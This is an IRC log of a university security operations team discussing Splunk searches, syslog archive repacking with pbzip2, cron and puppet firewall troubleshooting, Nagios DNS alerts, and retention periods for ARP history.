2014-11-21 13:40:18	soehlert	off the top of my head? no. im not arguing with you though. its on my roadmap to sack it. we had discussed already trying to replicate any useful rules in ossec and dump SEC, but i've been a lil busy
2014-11-21 13:48:47	jschipp	yeah, I wasn't expecting you to answer that lol. I didn't know it was on the roadmap map
2014-11-21 13:49:22	soehlert	ya you and i have discussed it with wardog before haha
2014-11-21 13:49:23	wardog	ug. cyclone is rhel. isn't it.
2014-11-21 13:49:29	soehlert	wardog: yes why
2014-11-21 13:49:46	soehlert	switching it seemed silly with the new CLUSTER WE ARE BUILDING
2014-11-21 13:50:03	jazoff	or not cluster we are building :)
2014-11-21 13:50:12	wardog	I wanted to work on the ldapsearch lookup script
2014-11-21 13:50:27	jschipp	I think we should consider sagan though especially since we'll have a suricata system up and then we don't have to learn a new rule language and then if we wanted to write them to the same database (same format) for correlation with ids events
2014-11-21 13:50:32	jschipp	ah, I must've forgot
2014-11-21 13:54:43	soehlert	jschipp: why not just use OSSEC which we have to use anyways?
2014-11-21 13:55:03	soehlert	id rather not add a whole new system without being necessary
2014-11-21 13:58:21	jschipp	second opinion which is what I see SEC as and the rule language will be more flexible
2014-11-21 13:58:46	soehlert	second opinion? 
2014-11-21 13:59:25	wardog	Should probably complete the projects already on the table before exploring new ones.
2014-11-21 13:59:35	jschipp	yeah, kind of like having bro and suricata i.e. not relying on 1 tool
2014-11-21 14:00:13	soehlert	i see. id rather get 1 of everything before doubling up
2014-11-21 14:50:45	soehlert	http://arstechnica.com/security/2014/11/using-a-password-manager-on-android-it-may-be-wide-open-to-sniffing-attacks/?utm_source=feedburner&utm_medium=feed&utm_campaign=Feed%3A+arstechnica%2Ftechnology-lab+%28Ars+Technica%3A+Technology+Lab%29
2014-11-21 14:53:45	wardog	ok, so I have a search that gives me a list of netids in splunk. I want to take that list and remove the netids I have in a CSV file on the server. I'm able to verify the csv file is there and I can read it (| lookupcsv filename). What next?
2014-11-21 14:54:17	wardog	jazoff: 
2014-11-21 14:54:46	jazoff	ah, how many columns does the csv have? just the one?
2014-11-21 14:54:51	wardog	just 1
2014-11-21 14:55:03	jazoff	hmm, i've done that when it has two.. because you can OUTPUT one of the other fields
2014-11-21 14:55:09	jazoff	and then filter on that field
2014-11-21 14:55:09	wardog	the results from the search have a column named 'netids' that's it. The csv has a field called 'users'
2014-11-21 14:55:30	jazoff	i know how to do it if the csv was even netid,1
2014-11-21 14:55:32	jazoff	for each row
2014-11-21 14:57:01	jazoff	i think using a subsearch may work
2014-11-21 14:57:04	jazoff	http://answers.splunk.com/answers/74563/limiting-a-search-using-a-csv-lookup-file.html
2014-11-21 14:57:32	soehlert	just curious, i never knew the endgoal of this, whatre you trying to accomplish wardog?
2014-11-21 14:59:45	wardog	soehlert: come up with a list of BW accounts that have note used RSA in the last 60 days.
2014-11-21 15:01:11	jazoff	so, if it is in a csv file with 2 columns it is easy.. 
2014-11-21 15:01:22	jazoff	if it was netid,someflag
2014-11-21 15:01:24	soehlert	ah cool that'll be nice
2014-11-21 15:01:35	jazoff	then you just need to search | lookup .... output someflag | search someflag=1
2014-11-21 15:01:39	wardog	yeah, once I can get splunk to play along
2014-11-21 15:01:49	jazoff	oh actually
2014-11-21 15:01:51	jazoff	i wonder if you can do
2014-11-21 15:02:01	jazoff	then you just need to search | lookup .... output netid | search netid=*
2014-11-21 15:02:14	jazoff	basically output the same field, I guess that would work
2014-11-21 15:02:19	jazoff	you may have to
2014-11-21 15:02:27	jazoff	output netid as netid_in_csv to prevent name conflict
2014-11-21 15:02:40	wardog	well the field in the csv is calle users
2014-11-21 15:23:41	jazoff	soehlert: bwbh user removal script seems to be working well :)
2014-11-21 15:32:01	soehlert	ooooh ya especially with control master
2014-11-21 15:32:07	soehlert	i did that in about 3 seconds
2014-11-21 15:32:14	jazoff	:)
2014-11-21 15:39:04	wardog	alright.... merge both results, count them and remove anything that has a count > 2
2014-11-21 15:39:09	wardog	>=
2014-11-21 15:39:19	jazoff	that works too
2014-11-21 15:39:41	wardog	uh. how do I do the count
2014-11-21 15:39:44	wardog	stats?
2014-11-21 15:39:47	jazoff	what search are you running?
2014-11-21 15:39:48	wardog	stats count by netid?
2014-11-21 15:40:47	wardog	ah...
2014-11-21 15:41:09	wardog	a search against RSA logs of successful logins.
2014-11-21 15:41:22	wardog	against a table of ldap users in bw.
2014-11-21 15:41:32	jazoff	i mean, the full search :)
2014-11-21 15:42:04	wardog	It's based of the 'BW Active Users' report
2014-11-21 15:42:07	wardog	on cyclone
2014-11-21 15:43:49	jazoff	what's the lookup table called?
2014-11-21 15:44:16	wardog	although I wonder how far back the rsa audit logs go
2014-11-21 15:44:57	jazoff	audit.runtime.com.rsa AUTHN_METHOD_SUCCESS | tail says 11/12
2014-11-21 15:45:26	wardog	so it does...
2014-11-21 15:45:31	soehlert	damn...jschipp you around? i can't get into thruk still and zephyr is down for probably good..
2014-11-21 15:45:34	wardog	Hopefully that will be fixed with the new non-cluster.
2014-11-21 15:45:46	jazoff	yeah
2014-11-21 15:45:52	soehlert	ugh i get the point guys :)
2014-11-21 15:46:07	wardog	just sayin
2014-11-21 15:46:08	jazoff	we can also look at syslog top talkers and possibly filtering out crap
2014-11-21 15:46:25	jazoff	and maybe routing some things like auth logs to another index as well as the gulp thing
2014-11-21 15:46:36	wardog	.... I might be able to look through historic logs, but they're all globbed into a single file.
2014-11-21 15:46:40	wardog	per day.
2014-11-21 15:46:40	wardog	;)
2014-11-21 15:47:03	wardog	Calgon take me away.
2014-11-21 15:47:03	jazoff	index=syslog | top host for the last few days is intersting
2014-11-21 15:47:22	jazoff	iforgevbox is apparently spewing PBS crap
2014-11-21 15:47:37	jazoff	or at least, was
2014-11-21 15:47:53	jazoff	was doing 60k messages a minute
2014-11-21 15:48:48	wardog	jeez.
2014-11-21 15:49:12	jazoff	looks like 1/4 of the syslog comes from rimantadine
2014-11-21 15:49:23	wardog	1/3
2014-11-21 15:49:30	jazoff	yeah, a lot of sendmail debug crap
2014-11-21 15:49:59	soehlert	wardog: ahhhh crap that thing. jazoff could probably do that right now before i finish this thought..
2014-11-21 15:50:20	jazoff	oh, change how the log archival script works?
2014-11-21 15:50:42	wardog	yeah.
2014-11-21 15:50:59	wardog	Have it zip up all daily files per host, instead of ALL of them in a single file
2014-11-21 15:51:45	soehlert	since its a python script i can get it done, but i figure thats an easy enough chagne its worth wasting jazoff's time for 20 seconds
2014-11-21 15:51:57	jazoff	lemme see :)
2014-11-21 15:52:57	jazoff	oh yeah, is that process working? i'm always confused when the logs should show up on lowp
2014-11-21 15:54:47	soehlert	it seemed to be last i checked (maybe 5 weeks ago..)
2014-11-21 15:54:47	soehlert	its supposed to keep i think two days plus current locally
2014-11-21 15:55:05	soehlert	but you can check that to whatever works best. splunk is the main user from seclogs archiving
2014-11-21 15:55:06	jazoff	the latest logs on lowp is 10/29
2014-11-21 15:55:22	wardog	o_O
2014-11-21 15:55:28	jazoff	10/26 actually, from 10/29
2014-11-21 15:58:04	jazoff	I suppose it would also be nice to write a program to unpack and recompress the existing logs on lowp
2014-11-21 15:58:20	wardog	that... would be very nice.
2014-11-21 15:59:56	jazoff	that shouldn't be too hard.. will take forever to run though
2014-11-21 16:00:12	wardog	Not like it's got anything else to do all day.
2014-11-21 16:00:18	jazoff	true :)
2014-11-21 16:00:32	wardog	hopefully it has the extra space at least.
2014-11-21 16:00:39	jazoff	oh yeah, plenty
2014-11-21 16:00:52	jazoff	i should be able to actually use the python tar modules and do it on the fly
2014-11-21 16:01:07	jazoff	will be a little slow, but not use much temp space
2014-11-21 16:15:18	soehlert	wait why unpack and recompress on lowp?
2014-11-21 16:15:25	soehlert	as in on demand?
2014-11-21 16:16:20	soehlert	wardog: ummm why was someone else monitoring zephyr?
2014-11-21 16:22:22	jazoff	soehlert: where else would I do it?
2014-11-21 16:23:23	soehlert	not where, just don't understand why
2014-11-21 16:23:36	soehlert	unless you mean for on demand searches
2014-11-21 16:23:51	jazoff	yeah, right now searching for a particular host is difficult
2014-11-21 16:24:01	soehlert	if you mean some sort of crontabbed thing that unpacks and recompresses them that seemed weird
2014-11-21 16:24:09	jazoff	no.. this would be a one time thing
2014-11-21 16:24:25	jazoff	to just redo all the existing logs that are already tehre
2014-11-21 16:29:22	soehlert	ahhh gotcha
2014-11-21 16:30:01	jazoff	seems to work so far
2014-11-21 16:38:42	jazoff	wardog: Take a look at /data/syslogs/seclogs/2014/01
2014-11-21 16:38:48	jazoff	wardog: that what you had in mind?
2014-11-21 16:39:27	jazoff	now you can bzcat /data/syslogs/seclogs/2014/01/*/bean*
2014-11-21 16:42:53	soehlert	why is there an uncompressed dir and the compressed file in /data/syslogs/seclogs/2014/01? is it just an artifact based on your script here?
2014-11-21 16:43:02	jazoff	yeah, i moved it to old/
2014-11-21 16:43:30	jazoff	the dir contains the new compressed file, the .tbz is the old file that was already there
2014-11-21 16:45:24	soehlert	gotcha
2014-11-21 16:47:38	jazoff	pretty fast so far, but i'm only up to may
2014-11-21 16:47:45	jazoff	7 seconds for the month
2014-11-21 16:48:25	jazoff	oh, because it is not working, sigh
2014-11-21 17:03:07	jazoff	ah, it works, but seems to not be able to read teh entire tar file
2014-11-21 17:18:14	jazoff	well, will have to revisit this on monday. seems to be an issue with python reading the tbz directly
2014-11-21 17:22:44	jazoff	ok, everything back to the way it was.
2014-11-21 17:22:46	 *	jazoff kicks python
2014-11-21 20:10:02	wardog	jazoff: on lowp?
2014-11-21 20:10:31	wardog	[wraquel@lowp 01]$ ls /data/syslogs/seclogs/2014/01/*/bean*
2014-11-21 20:10:32	wardog	ls: cannot access /data/syslogs/seclogs/2014/01/*/bean*: No such file or directory
2014-11-21 20:10:36	wardog	oh
2014-11-21 20:10:55	wardog	still, no such file or directory.
2014-11-21 20:11:29	wardog	oh. back the way it was.... gotcha
2014-11-21 20:11:50	wardog	As for zephyr. I'm guessing we had them watch it since it was the server for grid-sec.org
2014-11-21 20:12:02	wardog	Otherwise, I dunno. We should get a list of what they're monitoring.
2014-11-21 20:12:15	wardog	Hopefully I didn't miss something else that was on zephyr
2014-11-22 00:40:31	soehlert	wardog: i shut down zephyr but it's still a thing. we can turn it back on if we need
2014-11-24 07:54:59	<--	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has quit (Quit: Leaving.)
2014-11-24 08:27:02	-->	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has joined #security
2014-11-24 09:13:31	jazoff	soehlert: so back to syslogs on lowp.. any idea why the newest logs are from 10/26?
2014-11-24 09:21:55	wardog	why
2014-11-24 09:21:56	wardog	?
2014-11-24 09:22:01	wardog	or, where
2014-11-24 09:22:38	jazoff	ls -l /data/syslogs/seclogs/2014
2014-11-24 09:24:05	soehlert	no i don't know why they stopped rotating
2014-11-24 09:24:26	wardog	ah
2014-11-24 09:25:07	jazoff	where does mail to root go on the syslog box? the output from the cron job should be there
2014-11-24 09:26:16	soehlert	it should security-admin@ncsa
2014-11-24 09:28:42	soehlert	except i cant check right now because it keeps saying my password is incorrect...bahh
2014-11-24 09:31:38	soehlert	ok well apparently there is no cron job?!
2014-11-24 09:32:01	soehlert	soo that explains the why...
2014-11-24 09:34:19	jazoff	ah
2014-11-24 09:34:26	jazoff	puppet is not deployign the file?
2014-11-24 09:34:43	jazoff	oh, it's commented out
2014-11-24 09:35:23	soehlert	oh wait i forgot it was a cron.d file not in the crontab
2014-11-24 09:35:23	soehlert	the file is there
2014-11-24 09:46:10	soehlert	well the permissions were off, so maybe that was it?
2014-11-24 10:03:05	jazoff	oh, was it not executable?
2014-11-24 10:08:01	soehlert	i mean on the cron file
2014-11-24 10:08:19	soehlert	archive script is executable
2014-11-24 10:08:25	jazoff	oh
2014-11-24 10:08:40	jazoff	the cron file doesn't need to be executable
2014-11-24 10:12:23	soehlert	right i know
2014-11-24 10:12:34	soehlert	the permissions were still off
2014-11-24 10:13:03	jazoff	oh:)
2014-11-24 11:47:26	soehlert	this appointment is taking way longer than i expected.also not feeling well. gonna take the afternoon off to lay down. if you need somethingi'll try to check back later and see whats whaht
2014-11-24 15:34:17	jazoff	oh, so speaking of sec sending mail as you... it's definitely some kind of environment leakage
2014-11-24 15:35:24	jazoff	/proc/28321/loginuid for the sec process contains your user id
2014-11-24 15:42:20	wardog	hrm.
2014-11-24 15:42:33	wardog	The host was not found in any recent ARP tables. This host probably hasn't been on the network in a while. The ARP table history is cleared from Netdot every Sunday
2014-11-24 15:52:00	jazoff	interesting
2014-11-24 15:52:10	jazoff	when I ran netdisco I kept data for 13 months :)
2014-11-24 16:03:47	wardog	for albany?
2014-11-24 16:03:52	jazoff	yeah
2014-11-24 16:07:01	wardog	much more than we'd see here. About how much data was that?
2014-11-24 16:07:13	jazoff	not much.. a few gigs
2014-11-24 16:07:32	jazoff	mostly it was entries for the wireless network.. high turnover
2014-11-24 16:07:39	wardog	hrm.
2014-11-24 16:07:56	jazoff	for wired areas that used static dhcp you'd get one record per host that would just get the last seen time updated
2014-11-24 17:07:29	soehlert	jschipp: lots of nagios failures on seclogs
2014-11-25 06:02:02	soehlert	woo got host based auth working from bastions to bw-outbox via puppet
2014-11-25 06:34:57	soehlert	clearly failing at this sleeping thing so far tonight, but i'm going to try to get a few hours in here and probably be a little late, but i got a good head start this morning.
2014-11-25 08:47:59	wardog	bw-outbox?
2014-11-25 09:03:53	jazoff	wardog: the box for uploading files to s3
2014-11-25 09:04:18	wardog	right.
2014-11-25 09:04:48	wardog	ah... just noticed it on RI-D
2014-11-25 09:04:54	wardog	er, wrong chan
2014-11-25 09:50:05	eyrich	i have more oneplus one invites if you know anyone looking for one
2014-11-25 09:58:05	wardog	What did you think of it. And how much is it?
2014-11-25 09:58:37	wardog	Aren't they releasing in 2 days anyway?
2014-11-25 09:59:33	eyrich	i like it a bunch, $350 or a 64GB 5.5" screen
2014-11-25 10:00:14	eyrich	I dont think they are releasing, so far invites and 2 open order sessions 1 hour each and I think the servers melted during the first one
2014-11-25 10:03:33	eyrich	it runs CM11 out of the box - which is why I first got interested, as I have deviced I do not like AOSP or Google play edition Android
2014-11-25 10:04:33	jazoff	neat
2014-11-25 10:04:44	jazoff	i like my nexus5.. even though the screen is cracked :)
2014-11-25 10:05:13	jazoff	if it wasn't cracked I'd maybe upgrade and give the n5 to the gf
2014-11-25 10:05:30	jazoff	she has a gs3 that really needs CM
2014-11-25 10:06:24	eyrich	my dad and wife are running gs3 10.2, tried upgrading one to cm11 last friday, 3 hours later i finally got cm10.2 working again and gave it back
2014-11-25 10:06:58	wardog	I'll take an invite.
2014-11-25 10:07:05	eyrich	I'm upgrading another family member from a gs3 to a HTC One M8 this weekend so I have a gs3 to test uprading on
2014-11-25 10:07:14	eyrich	what email you want it sent to?
2014-11-25 10:07:25	wardog	warquel@gmail.com
2014-11-25 10:07:57	eyrich	sent - let me know if you get the email, if not I can provide the code
2014-11-25 10:08:27	wardog	Got it
2014-11-25 15:48:34	wardog	wefel's asking what a good retention period for ARP history is for our purposes. What do you guys think? I would probably say a year but I doubt we'd ever really even bother for events that far back. I think 90 days should be a sufficient. I can't recall what our rentention time is for our current logs.
2014-11-25 15:49:58	jazoff	90 days sounds good
2014-11-25 15:52:35	soehlert	90 days should be plenty as far as im concerned
2014-11-26 09:06:41	eyrich	wardog: which invite code did I send you?
2014-11-26 10:24:50	jschipp	http://seclists.org/fulldisclosure/2014/Nov/74
2014-11-26 10:50:19	jschipp	down to 6 perl modules that packages aren't available for and cpanm fails to install :(
2014-11-26 18:40:45	wardog	eyrich: ends in 6ZNI
2014-11-28 09:44:54	jazoff	is everyone off today?
2014-11-28 21:08:40	wardog	yep
2014-11-28 21:08:42	wardog	holiday
2014-11-28 21:09:00	wardog	http://illinois.edu/calendar/list/468
2014-12-01 08:29:16	jazoff	morning :)
2014-12-01 08:46:32	wardog	mornin
2014-12-01 09:46:48	soehlert	just found out my dad needs to have more surgery. trying to figure out the details of if i need to go home and when and all that. not sure whats going on yet.
2014-12-01 09:47:02	jazoff	:(
2014-12-01 10:40:32	jazoff	oh, so I re-wrote the log archive repack program in go.. that seems to not have the issue the python tar library had
2014-12-01 10:40:59	jazoff	is there any reason we couldn't use regular gzip over bzip2? bzip2 does produce smaller log files, but it is sloooooow
2014-12-01 10:42:05	wardog	I thought we ended up using parallel bzip2 to speed that up.
2014-12-01 10:42:14	jazoff	hmm
2014-12-01 10:46:18	jazoff	well, that is fster
2014-12-01 10:46:58	jazoff	so I think the only issue with repacking the logs is that the number of files will increase a lot
2014-12-01 10:47:10	jazoff	from 1 file a day to.. many files :)
2014-12-01 10:47:14	wardog	yeah, so have to keep an eye on inode usage
2014-12-01 10:47:52	wardog	Should probably send an alert at 85% or something
2014-12-01 10:47:56	jazoff	i don't think it would be too bad though.. even 8k files a day is only 3mil a year
2014-12-01 10:48:03	jazoff	and I think you need many more files than that to run out of inodes
2014-12-01 10:48:29	wardog	If we had better asset management, I wouldn't mind grouping logs by functional group.
2014-12-01 10:48:44	jazoff	well I did notice there is more than one log file per host per day
2014-12-01 10:48:53	wardog	I suppose you could potentally look for patterns to put together, like golub###, etc
2014-12-01 10:49:05	jazoff	yeah
2014-12-01 10:49:20	wardog	That would cut it down significantly
2014-12-01 10:49:25	jazoff	that would complicate the program considerbly.. still doable though
2014-12-01 10:50:43	jazoff	ah.. one of the more recent log tarballs has 29531 files
2014-12-01 10:50:54	wardog	Is that the full day of logs in one?
2014-12-01 10:51:01	jazoff	yeah
2014-12-01 10:51:45	wardog	But that's for each machine and hourly, so that's like 1200 systems total.
2014-12-01 10:52:07	wardog	1300 or so. dasalot
2014-12-01 10:52:13	jazoff	correct, 1242
2014-12-01 10:52:33	jazoff	so, 1200 files not so bad, 29k is a bit much
2014-12-01 10:52:37	wardog	Meh, that's doable. Yeah.
2014-12-01 10:52:46	wardog	1200/day, doable.
2014-12-01 10:52:53	wardog	29k/day redunk
2014-12-01 11:04:51	jschipp	I wouldn't mind removing the hourly rotation on seclogs, keeping one file a day for each host, easier to look at too
2014-12-01 11:05:59	jazoff	hmm, looks like the per hour log files are not in order in the tar file
2014-12-01 11:06:07	jazoff	which means I can't repack it on the fly
2014-12-01 11:07:22	jazoff	though just unpacking to a temp dir makes the program a lot easier to write
2014-12-01 11:22:29	jazoff	so.. i can unpack the tarball, merge all the rabbitmq_2014102600.log rabbitmq_2014102601.log rabbitmq_2014102602.log etc into rabbitmq.log and then bzip rabbitmq.log ?
2014-12-01 11:46:59	eyrich	jschipp: what dns server is nagio using
2014-12-01 11:48:03	eyrich	kerberos.teragrid.org seems to be working from the main ncsa servers now
2014-12-01 11:52:06	jschipp	eyrich: the NCSA servers
2014-12-01 11:52:13	eyrich	hmm, ok
2014-12-01 11:52:37	jschipp	it's working, did you see the OK notification?
2014-12-01 11:53:11	eyrich	yes - the issue was getting down messages when all the servers I was checking gave back the right answer
2014-12-01 11:54:17	jschipp	do you know about long that was until Nagios resolve the name?
2014-12-01 11:54:59	eyrich	it was more then a few minutes, how often is it checking? I figured it was checking as often was it was sending alerts
2014-12-01 11:55:35	eyrich	lunch time
2014-12-01 11:55:55	jschipp	every minute but 3 checks results in a new hard state, so I can account for 3 minutes
2014-12-01 11:56:41	jschipp	if it was more than that then it might be a setting with unbound that needs tweaking
2014-12-01 12:06:51	jschipp	I installed a bunch of perl modules to /opt/perl on a fresh vm and then set export PERL5LIB=/opt/perl and ran make testdeps from cif source and it says they're all missing
2014-12-01 12:07:36	jazoff	i dont think thats the dir you set
2014-12-01 12:07:44	jazoff	i think you need PERL5LIB=/opt/perl/lib/...
2014-12-01 12:08:01	jazoff	like /opt/perl/lib/perl5/5.6.1/ or something like that
2014-12-01 12:10:30	jschipp	jazoff: thanks, that  was simple enough. 
2014-12-01 12:11:05	jazoff	i think i only figured that out before I straced perl once
2014-12-01 12:13:17	jschipp	lol
2014-12-01 12:16:49	wardog	jazoff: maybe leave the date at the end?
2014-12-01 12:16:59	wardog	rabbitmq_20141026.log
2014-12-01 12:17:18	wardog	Just in case of expanding multi-day logs for an investigation.
2014-12-01 12:17:31	wardog	won't have to deal with renaming.
2014-12-01 12:25:10	jazoff	oh, hmm
2014-12-01 12:25:13	jazoff	just when I got it working
2014-12-01 12:25:30	jazoff	no problem though, few line change
2014-12-01 12:28:40	jazoff	wardog: check out /data/syslogs/seclogs/2014/01/01/ on lowp
2014-12-01 12:32:07	wardog	nice
2014-12-01 12:32:27	wardog	what's 01.tbz? The original file?
2014-12-01 12:32:31	jazoff	yeah
2014-12-01 12:32:44	wardog	cool
2014-12-01 12:43:33	wardog	How's the certificate interface stuff going?
2014-12-01 12:43:55	jazoff	not really going, but I'm ready to start on it now
2014-12-01 12:44:12	jazoff	the BHR stuff is pretty much done, or at least 90% done that it doesnt need much work right now
2014-12-01 12:44:22	wardog	cool
2014-12-01 12:44:34	jazoff	that ssl mate site really gave me a lot of ideas
2014-12-01 12:44:53	jazoff	you think people around here would prefer a CLI cert tool rather than a web interface?
2014-12-01 12:45:31	wardog	I think some MAY use the option. Although, with 3 year certs, it may easire to just go through the pain of a 1 time web submit.
2014-12-01 12:45:39	wardog	Bulk, though, they need a cli option.
2014-12-01 12:45:43	soehlert	i'm sure people would like cli
2014-12-01 12:45:54	wardog	I think BW submitted a little over 100 a few weeks ago.
2014-12-01 12:46:07	jazoff	well i think the really nice part is that f you are on a system that you'd use openssl on the CLI to generate the CSR
2014-12-01 12:46:20	jazoff	then having that same CLI ship it to remote system makes sense
2014-12-01 12:46:21	ncsabot	http://d2f8dzk2mhcqts.cloudfront.net/0772_PEW_Roundup/09_Squirrel.jpg
2014-12-01 12:46:34	wardog	wuh?
2014-12-01 12:46:35	jazoff	hah
2014-12-01 12:46:55	jazoff	what did i say.. CSR?
2014-12-01 12:47:14	soehlert	ummm.. thats awesome
2014-12-01 12:47:28	jazoff	ooh, ship it
2014-12-01 12:47:29	ncsabot	http://www.cybersalt.org/images/funnypictures/s/supersquirrel.jpg
2014-12-01 12:47:35	wardog	HAHA
2014-12-01 12:47:49	wardog	ship it
2014-12-01 12:47:50	ncsabot	http://gifs.gifbin.com/092010/1285616410_ship-launch-floods-street.gif
2014-12-01 12:47:59	jazoff	help ship it
2014-12-01 12:47:59	ncsabot	http://gifs.gifbin.com/092010/1285616410_ship-launch-floods-street.gif
2014-12-01 12:48:07	jazoff	well, the docs say
2014-12-01 12:48:09	wardog	whoes does your have squirrels?
2014-12-01 12:48:11	jazoff	#   ship it - Display a motivation squirrel
2014-12-01 12:48:12	ncsabot	http://www.cybersalt.org/images/funnypictures/s/supersquirrel.jpg
2014-12-01 12:48:41	jschipp	lulz
2014-12-01 12:48:48	jazoff	i'm sure that is an inside joke at github or somethign
2014-12-01 12:49:00	wardog	weird. I get ships, you get squirrels
2014-12-01 12:49:05	wardog	ship it
2014-12-01 12:49:05	ncsabot	http://28.media.tumblr.com/tumblr_lybw63nzPp1r5bvcto1_500.jpg
2014-12-01 12:49:11	wardog	There
2014-12-01 12:49:16	wardog	that was is cool
2014-12-01 12:54:12	wardog	splunk question. I have a search that results in a column of dates and a column of netids. I want all the dates within the last, say 3 days. I don't want to use the date range option on the right of the search input bar
2014-12-01 12:54:36	wardog	the dates are all in the _time field.
2014-12-01 13:00:59	jazoff	hm
2014-12-01 13:02:13	jazoff	i think you can just add _time > '2014-11-28'
2014-12-01 13:02:58	jazoff	failing that, | eval stime=strftime(_time,"%Y%m%d") | search stime > 20141128 maybe?
2014-12-01 13:12:06	wardog	I tried doing the eval thing, but... oh... yeah. I'll try that again...
2014-12-01 13:20:34	jazoff	log repacking getting slower and slower as the year goes on
2014-12-01 13:20:52	jazoff	though it doesnt help that some days have hosts that spewed millions of lines of crap
2014-12-01 13:23:06	jazoff	pbzip sure does a good job of keeping all the cores busy
2014-12-01 13:23:53	soehlert	ya i saw improvement of pbzip vs bzip but hadn't had a good chance to really compare pbzip to gzip or anything else for that matter
2014-12-01 13:24:44	jazoff	login to lowp and run htop :)
2014-12-01 13:25:01	wardog	yikes
2014-12-01 13:25:29	jazoff	almost done with march
2014-12-01 13:25:41	 *	soehlert is scared
2014-12-01 13:27:39	jazoff	after rewriting the program a few times the end result is pretty simple
2014-12-01 13:27:57	jazoff	untar + group by hostname + cat | pbzip into a new log file
2014-12-01 13:28:18	wardog	Good thing that server is a cooled DC.
2014-12-01 13:28:19	soehlert	sweet thanks for undertaking this project
2014-12-01 13:28:28	jazoff	:)
2014-12-01 13:28:38	wardog	yes, kudos
2014-12-01 13:31:29	jazoff	looks like it has a -p option for number of cores to use
2014-12-01 13:31:37	jazoff	i'll change it to be only half the cpus
2014-12-01 13:31:49	jazoff	since its probably using hyperthreading they arent real cores anyway
2014-12-01 13:34:48	wardog	TIL there's a server called she-books
2014-12-01 13:35:10	jazoff	so, now this works:
2014-12-01 13:35:12	jazoff	bzcat /data/syslogs/seclogs/2014/*/*/bean*
2014-12-01 13:37:03	wardog	That reminds me.  I should redirect my bean replacement to syslog-sec
2014-12-01 13:40:33	wardog	oh. looks like I already did it
2014-12-01 13:44:39	jazoff	that's the best kind of things that you need to do
2014-12-01 13:45:26	soehlert	i wish my to do list was like that
2014-12-01 14:05:53	wardog	do we want a cert for git-sec?
2014-12-01 14:26:05	eyrich	soehlert: got a sec? can you come over here?
2014-12-01 14:28:40	eyrich	soehlert: never midn
2014-12-01 14:34:04	eyrich	ok - I think the issue with the nagios messages for kerberos is because unbound has google in forwarder rotation.
2014-12-01 14:34:38	eyrich	well at least that is a place to start
2014-12-01 14:35:25	eyrich	i think some strange things are going on with teragrid.org but since NCSA dns is authoritiative for those we should be getting good answers back
2014-12-01 14:53:33	jschipp	wardog: yeah, might as well
2014-12-02 03:25:27	soehlert	the topN looks a bit iffy today. that's a crap ton for a leovip machine..
2014-12-02 08:41:33	wardog	effing leo* systems
2014-12-02 09:17:18	soehlert	whatever happened to the idea of making them their own separate island and treating them like non ncsa hosts
2014-12-02 09:50:40	wardog	I think what was supposed to happen is that they were going to move to 3003 but would not be able to meet compliance with the new 3003 security standard, which isn't out yet.
2014-12-02 11:32:11	jazoff	hah..
2014-12-02 11:32:21	jazoff	was trying to figure out why netflow indexer on lowp went broke
2014-12-02 11:32:46	jazoff	roots crontab had find /data/bro -path /data/bro/derecho -prune -o -type f -ctime +365 -exec rm -f {} \;
2014-12-02 11:32:55	jazoff	and I put netflow indexer in /data/bro/index
2014-12-02 11:32:58	jazoff	about a year ago...
2014-12-02 11:33:29	jazoff	puppet actually tried to fix it but failed for some reason leaving it half installed
2014-12-02 11:33:43	jazoff	so, fixed it and changed the cron job to find /data/bro/20* 
2014-12-02 14:50:29	jschipp	I created some rpm's, how do I add them to repo-sec?
2014-12-02 14:51:19	eyrich	I cant ssh to dew
2014-12-02 14:53:19	jazoff	hmm
2014-12-02 14:53:25	jazoff	works from fog
2014-12-02 14:53:26	jschipp	where are you coming from?
2014-12-02 14:53:39	jschipp	brb, walk
2014-12-02 14:53:50	eyrich	yes frokm dog but not my desktop
2014-12-02 14:53:54	eyrich	from fog
2014-12-02 14:55:27	wardog	Did splunks-sec ever get the extra hard drives added?
2014-12-02 14:55:30	jazoff	doesn't appear to be anything in puppet that opens up port 22
2014-12-02 15:01:00	jazoff	so.. the bigger question is how does fog even work
2014-12-02 15:06:46	wardog	yeah, firewall on dew locks down to specific hosts.
2014-12-02 15:08:10	soehlert	working on it
2014-12-02 15:48:41	jschipp	do packages on repo-sec just get dropped in /var/www/html/ncsa? do I have to create an index or something too?
2014-12-02 15:52:37	soehlert	put it in there and run /usr/bin/createrepo ${repo_path}
2014-12-02 15:52:49	soehlert	repo_path is /var/www/html/ncsa
2014-12-02 15:53:13	soehlert	jazoff: how does fog work is a good question. this is in the fw "ACCEPT     tcp  --  0.0.0.0/0            0.0.0.0/0           multiport dports 22 /* 300 all ssh from anywhere for bastion host */"
2014-12-02 15:53:23	soehlert	which definitely looks like a puppet rule, but i dont see it anywhere
2014-12-02 15:54:34	jschipp	soehlert: kk, thanks
2014-12-02 15:58:27	soehlert	ok i added a rule for that that i can account for. that rule is still in there, but at least one is in there that SHOULD be working instead of one that is \_()_/
2014-12-02 15:59:55	soehlert	and now dew allows connections. not really sure how to remove the old ssh rule on fog, but ill work on that
2014-12-02 16:01:25	soehlert	hmph. removed it manually and then reran puppet and it put it back..
2014-12-02 16:05:41	soehlert	also, jazoff is there a way to restrict iptables rules to an interface with the puppet stuff? i cant find an example of that
2014-12-02 16:07:03	soehlert	nvm figured that one out. forgot this was a puppet forge with docs
2014-12-02 16:08:41	jazoff	odd
2014-12-02 16:09:27	jazoff	soehlert: ah, it's in the ncsa_production branch
2014-12-02 16:09:34	jazoff	modules/ssh/manifests/init.pp:  firewall{'310 all ssh from anywhere for bastion host':
2014-12-02 16:09:42	soehlert	nah i just added that one
2014-12-02 16:09:48	jazoff	oh!
2014-12-02 16:09:49	soehlert	the one i cant get rid of is 300...
2014-12-02 16:10:06	soehlert	but i didnt add it to ncsa_production..
2014-12-02 16:10:18	soehlert	also fog is in production branch
2014-12-02 16:14:56	soehlert	i mean i guess its not a problem that it has two rules that accept ssh from anywhere, but it bugs me we cant find it
2014-12-02 16:15:56	jazoff	it used to exist in modules/ssh/manifests/init.pp
2014-12-02 16:16:41	jazoff	is fog using a cached catalog?
2014-12-02 16:18:22	soehlert	no im able to grab new ones fine
2014-12-02 16:18:31	jazoff	odd
2014-12-03 02:37:20	soehlert	so that leovip machine is still in first and has almost double the traffic this time. should we say something? try to figure out what it's doing? i mean it's ridiculous the difference between that and the next host.
2014-12-03 07:59:56	jazoff	what is the ip for it?
2014-12-03 08:00:03	jazoff	I think i'm still not getting the topn reports for some reason
2014-12-03 08:00:22	jazoff	which is funny because I get 10000000 emails about other things
